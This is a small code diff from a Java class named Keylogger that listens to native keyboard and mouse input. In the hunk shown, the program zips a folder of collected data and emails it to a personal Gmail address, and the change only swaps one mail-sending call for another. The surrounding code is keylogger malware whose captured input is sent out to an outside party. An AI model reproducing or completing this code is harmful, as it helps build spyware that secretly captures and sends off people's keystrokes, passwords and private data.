@@ -40,8 +40,7 @@ public class Keylogger implements NativeKeyListener,NativeMouseInputListener{
         appZip.generateFileList(new File(SOURCE_FOLDER));
         appZip.zipIt(OUTPUT_ZIP_FILE);
         
-        Mailer m=new Mailer("saha.sparsha@gmail.com");
-        m.send_mail();
+        Mailler.send_mail("saha.sparsha@gmail.com");
         
         
         
